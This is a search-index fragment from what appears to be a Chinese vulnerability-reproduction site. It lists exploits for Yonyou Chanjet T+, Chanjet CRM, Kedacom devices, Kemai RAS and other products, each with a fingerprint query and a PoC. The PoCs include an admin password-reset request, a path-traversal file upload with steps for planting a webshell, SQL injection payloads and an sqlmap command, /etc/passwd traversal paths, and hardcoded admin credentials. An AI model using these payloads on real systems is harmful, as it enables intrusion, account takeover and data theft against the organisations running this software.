","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9At-recoverpassword.aspx-%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9At-recoverpassword.aspx-%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 用友 畅捷通T+ ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9At-recoverpassword.aspx-%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9At-recoverpassword.aspx-%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"畅捷通-TPlus\" ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9At-recoverpassword.aspx-%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9At-recoverpassword.aspx-%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC, 重置账号密码为 admin/123qwe POST /tplus/ajaxpro/RecoverPassword,App_Web_recoverpassword.aspx.cdcab7d2.ashx?method=SetNewPwd {\"pwdNew\":\"46f94c8de14fb36680850768ff1b7f2a\"} ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9At-recoverpassword.aspx-%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9At-recoverpassword.aspx-%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"用友 畅捷通T+ Upload.aspx 任意文件上传漏洞 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9At-upload.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9At-upload.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 用友 畅捷通T+ Upload.aspx接口存在任意文件上传漏洞，攻击者通过 preload 参数绕过身份验证进行文件上传，控制服务器 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9At-upload.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9At-upload.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 用友 畅捷通T+ ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9At-upload.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9At-upload.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"畅捷通-TPlus\" ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9At-upload.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9At-upload.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 存在漏洞的接口为/tplus/SM/SetupAccount/Upload.aspx, 对应文件 App_Web_upload.aspx.9475d17f.dll 上传文件类型验证不完善，可上传任意文件到服务器中的任意位置，验证POC POST /tplus/SM/SetupAccount/Upload.aspx?preload=1 HTTP/1.1 Host: Accept: */* Accept-Encoding: gzip, deflate Content-Length: 261 User-Agent: Mozilla/5.0 (iPod; U; CPU iPhone OS 3_0 like Mac OS X; ko-KR) AppleWebKit/535.16.4 (KHTML, like Gecko) Version/3.0.5 Mobile/8B117 Safari/6535.16.4 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVXR9biLu Connection: close ------WebKitFormBoundaryVXR9biLu Content-Disposition: form-data; name=\"File1\";filename=\"../../../../../../../Program Files (x86)/Chanjet/TPlusStd/WebSite/1.txt\" Content-Type: image/jpeg 1 ------WebKitFormBoundaryVXR9biLu-- 由于应用为预编译的，直接上传的 aspx木马无法直接利用，需要通过上传 dll 与 compiled 文件后利用Webshell 将 dll 与 compiled 文件上传至 Web应用的 bin目录上，aspx上传至 Web根目录下 再访问写入的Webshell进行连接 /tplus/shell.aspx?preload=1 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9At-upload.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9At-upload.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"用友 畅捷通远程通 GNRemote.dll SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A-gnremote.dll-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A-gnremote.dll-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 用友 畅捷通远程通 GNRemote.dll SQL注入漏洞，攻击者通过SQL注入可以获取服务器敏感信息或者使用万能密码登录设备 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A-gnremote.dll-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A-gnremote.dll-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 用友 畅捷通远程通 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A-gnremote.dll-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A-gnremote.dll-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 body=\"远程通CHANJET_Remote\" ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A-gnremote.dll-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A-gnremote.dll-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC POST /GNRemote.dll?GNFunction=LoginServer\u0026decorator=text_wrap\u0026frombrowser=esl username=%22'%20or%201%3d1%3b%22\u0026password=%018d8cbc8bfc24f018\u0026ClientStatus=1 ","date":"0001-01-01","objectID":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A-gnremote.dll-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%94%A8%E5%8F%8B-%E7%95%85%E6%8D%B7%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A-gnremote.dll-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"畅捷CRM get_usedspace.php SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E7%95%85%E6%8D%B7crm-get_usedspace.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%95%85%E6%8D%B7crm-get_usedspace.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 畅捷CRM get_usedspace.php存在SQL漏洞，通过漏洞可获取数据库敏感信息 ","date":"0001-01-01","objectID":"/%E7%95%85%E6%8D%B7crm-get_usedspace.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%95%85%E6%8D%B7crm-get_usedspace.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 畅捷CRM ","date":"0001-01-01","objectID":"/%E7%95%85%E6%8D%B7crm-get_usedspace.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%95%85%E6%8D%B7crm-get_usedspace.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"畅捷CRM\" ","date":"0001-01-01","objectID":"/%E7%95%85%E6%8D%B7crm-get_usedspace.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%95%85%E6%8D%B7crm-get_usedspace.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /webservice/get_usedspace.php?site_id=-1159 UNION ALL SELECT CONCAT(0x76756c6e,0x76756c6e,0x76756c6e)-- 使用Sqlmap验证漏洞 sqlmap -u \"http://xxx.xxx.xxx.xxx:8000/webservice/get_usedspace.php?site_id=1\" -p site_id ","date":"0001-01-01","objectID":"/%E7%95%85%E6%8D%B7crm-get_usedspace.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%95%85%E6%8D%B7crm-get_usedspace.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"畅捷CRM 后台附件任意文件上传漏洞 ","date":"0001-01-01","objectID":"/%E7%95%85%E6%8D%B7crm-%E5%90%8E%E5%8F%B0%E9%99%84%E4%BB%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%95%85%E6%8D%B7crm-%E5%90%8E%E5%8F%B0%E9%99%84%E4%BB%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 畅捷CRM 后台附件存在任意文件上传漏洞，通过解析漏洞可跳过后缀更改获取网站权限 ","date":"0001-01-01","objectID":"/%E7%95%85%E6%8D%B7crm-%E5%90%8E%E5%8F%B0%E9%99%84%E4%BB%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%95%85%E6%8D%B7crm-%E5%90%8E%E5%8F%B0%E9%99%84%E4%BB%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 畅捷CRM ","date":"0001-01-01","objectID":"/%E7%95%85%E6%8D%B7crm-%E5%90%8E%E5%8F%B0%E9%99%84%E4%BB%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%95%85%E6%8D%B7crm-%E5%90%8E%E5%8F%B0%E9%99%84%E4%BB%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"畅捷CRM\" ","date":"0001-01-01","objectID":"/%E7%95%85%E6%8D%B7crm-%E5%90%8E%E5%8F%B0%E9%99%84%E4%BB%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%95%85%E6%8D%B7crm-%E5%90%8E%E5%8F%B0%E9%99%84%E4%BB%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 部分存在空密码 admin/空密码 登录后添加客户，并上传附件为PHP文件，其中文件名为 xxx.xxx.php格式，越过系统中的后缀更改 点击文件名跳转 ","date":"0001-01-01","objectID":"/%E7%95%85%E6%8D%B7crm-%E5%90%8E%E5%8F%B0%E9%99%84%E4%BB%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%95%85%E6%8D%B7crm-%E5%90%8E%E5%8F%B0%E9%99%84%E4%BB%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"科达 MTS转码服务器 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E7%A7%91%E8%BE%BE-mts%E8%BD%AC%E7%A0%81%E6%9C%8D%E5%8A%A1%E5%99%A8-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%A7%91%E8%BE%BE-mts%E8%BD%AC%E7%A0%81%E6%9C%8D%E5%8A%A1%E5%99%A8-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 KEDACOM MTS转码服务器存在任意文件读取漏洞，攻击这通过漏洞可以读取服务器任意信息 ","date":"0001-01-01","objectID":"/%E7%A7%91%E8%BE%BE-mts%E8%BD%AC%E7%A0%81%E6%9C%8D%E5%8A%A1%E5%99%A8-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%A7%91%E8%BE%BE-mts%E8%BD%AC%E7%A0%81%E6%9C%8D%E5%8A%A1%E5%99%A8-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 MTS转码服务器 ","date":"0001-01-01","objectID":"/%E7%A7%91%E8%BE%BE-mts%E8%BD%AC%E7%A0%81%E6%9C%8D%E5%8A%A1%E5%99%A8-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%A7%91%E8%BE%BE-mts%E8%BD%AC%E7%A0%81%E6%9C%8D%E5%8A%A1%E5%99%A8-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"MTS转码服务器\" ","date":"0001-01-01","objectID":"/%E7%A7%91%E8%BE%BE-mts%E8%BD%AC%E7%A0%81%E6%9C%8D%E5%8A%A1%E5%99%A8-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%A7%91%E8%BE%BE-mts%E8%BD%AC%E7%A0%81%E6%9C%8D%E5%8A%A1%E5%99%A8-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /../../../../../../../../etc/passwd ","date":"0001-01-01","objectID":"/%E7%A7%91%E8%BE%BE-mts%E8%BD%AC%E7%A0%81%E6%9C%8D%E5%8A%A1%E5%99%A8-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%A7%91%E8%BE%BE-mts%E8%BD%AC%E7%A0%81%E6%9C%8D%E5%8A%A1%E5%99%A8-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"科达 网络键盘控制台 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E7%A7%91%E8%BE%BE-%E7%BD%91%E7%BB%9C%E9%94%AE%E7%9B%98%E6%8E%A7%E5%88%B6%E5%8F%B0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%A7%91%E8%BE%BE-%E7%BD%91%E7%BB%9C%E9%94%AE%E7%9B%98%E6%8E%A7%E5%88%B6%E5%8F%B0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 KEDACOM 网络键盘控制台存在任意文件读取漏洞，攻击这通过漏洞可以读取服务器任意信息 ","date":"0001-01-01","objectID":"/%E7%A7%91%E8%BE%BE-%E7%BD%91%E7%BB%9C%E9%94%AE%E7%9B%98%E6%8E%A7%E5%88%B6%E5%8F%B0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%A7%91%E8%BE%BE-%E7%BD%91%E7%BB%9C%E9%94%AE%E7%9B%98%E6%8E%A7%E5%88%B6%E5%8F%B0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 KEDACOM 网络键盘控制台 ","date":"0001-01-01","objectID":"/%E7%A7%91%E8%BE%BE-%E7%BD%91%E7%BB%9C%E9%94%AE%E7%9B%98%E6%8E%A7%E5%88%B6%E5%8F%B0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%A7%91%E8%BE%BE-%E7%BD%91%E7%BB%9C%E9%94%AE%E7%9B%98%E6%8E%A7%E5%88%B6%E5%8F%B0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"网络键盘控制台\" ","date":"0001-01-01","objectID":"/%E7%A7%91%E8%BE%BE-%E7%BD%91%E7%BB%9C%E9%94%AE%E7%9B%98%E6%8E%A7%E5%88%B6%E5%8F%B0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%A7%91%E8%BE%BE-%E7%BD%91%E7%BB%9C%E9%94%AE%E7%9B%98%E6%8E%A7%E5%88%B6%E5%8F%B0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /../../../../../../../../etc/passwd ","date":"0001-01-01","objectID":"/%E7%A7%91%E8%BE%BE-%E7%BD%91%E7%BB%9C%E9%94%AE%E7%9B%98%E6%8E%A7%E5%88%B6%E5%8F%B0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%A7%91%E8%BE%BE-%E7%BD%91%E7%BB%9C%E9%94%AE%E7%9B%98%E6%8E%A7%E5%88%B6%E5%8F%B0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"科迈 RAS系统 硬编码管理员漏洞 ","date":"0001-01-01","objectID":"/%E7%A7%91%E8%BF%88-ras%E7%B3%BB%E7%BB%9F-%E7%A1%AC%E7%BC%96%E7%A0%81%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%A7%91%E8%BF%88-ras%E7%B3%BB%E7%BB%9F-%E7%A1%AC%E7%BC%96%E7%A0%81%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 科迈 RAS系统 存在硬编码管理员漏洞，在内部自动创建了两个管理员账户，可被利用于登录 ","date":"0001-01-01","objectID":"/%E7%A7%91%E8%BF%88-ras%E7%B3%BB%E7%BB%9F-%E7%A1%AC%E7%BC%96%E7%A0%81%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%A7%91%E8%BF%88-ras%E7%B3%BB%E7%BB%9F-%E7%A1%AC%E7%BC%96%E7%A0%81%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 科迈 RAS系统 ","date":"0001-01-01","objectID":"/%E7%A7%91%E8%BF%88-ras%E7%B3%BB%E7%BB%9F-%E7%A1%AC%E7%BC%96%E7%A0%81%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%A7%91%E8%BF%88-ras%E7%B3%BB%E7%BB%9F-%E7%A1%AC%E7%BC%96%E7%A0%81%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"科迈-RAS系统\" ","date":"0001-01-01","objectID":"/%E7%A7%91%E8%BF%88-ras%E7%B3%BB%E7%BB%9F-%E7%A1%AC%E7%BC%96%E7%A0%81%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%A7%91%E8%BF%88-ras%E7%B3%BB%E7%BB%9F-%E7%A1%AC%E7%BC%96%E7%A0%81%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 可得知存在的账号密码为 user: RASCOM pass: 1A2b3C4d56. user: 1A2b3C4d56. pass: 1A2b3C4d56. 当开启RDP即可使用该账号登陆 ","date":"0001-01-01","objectID":"/%E7%A7%91%E8%BF%88-ras%E7%B3%BB%E7%BB%9F-%E7%A1%AC%E7%BC%96%E7%A0%81%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%A7%91%E8%BF%88-ras%E7%B3%BB%E7%BB%9F-%E7%A1%AC%E7%BC%96%E7%A0%81%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"章管家 Druid未授权访问漏洞 ","date":"0001-01-01","objectID":"/%E7%AB%A0%E7%AE%A1%E5%AE%B6-druid%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%AB%A0%E7%AE%A1%E5%AE%B6-druid%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 章管家 Druid存在未授权，导致信息泄露漏洞 ","date":"0001-01-01","objectID":"/%E7%AB%A0%E7%AE%A1%E5%AE%B6-druid%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%AB%A0%E7%AE%A1%E5%AE%B6-druid%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 章管家 ","date":"0001-01-01","objectID":"/%E7%AB%A0%E7%AE%A1%E5%AE%B6-druid%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%AB%A0%E7%AE%A1%E5%AE%B6-druid%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 章管家登录-公章在外防私盖 ","date":"0001-01-01","objectID":"/%E7%AB%A0%E7%AE%A1%E5%AE%B6-druid%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%AB%A0%E7%AE%A1%E5%AE%B6-druid%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证页面为 /druid/index.html ","date":"0001-01-01","objectID":"/%E7%AB%A0%E7%AE%A1%E5%AE%B6-druid%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%AB%A0%E7%AE%A1%E5%AE%B6-druid%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"紫光档案管理系统 editPass.html SQL注入漏洞 CNVD-2021-41638 ","date":"0001-01-01","objectID":"/%E7%B4%AB%E5%85%89%E6%A1%A3%E6%A1%88%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-editpass.html-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-41638/:0:0","tags":null,"title":"","uri":"/%E7%B4%AB%E5%85%89%E6%A1%A3%E6%A1%88%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-editpass.html-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-41638/"},{"categories":null,"content":"漏洞描述 紫光软件系统有限公司（以下简称“紫光软件”）是中国领先的行业解决方案和IT服务提供商。 紫光电子档案管理系统存在SQL注入漏洞。攻击者可利用漏洞获取数据库敏感信息。 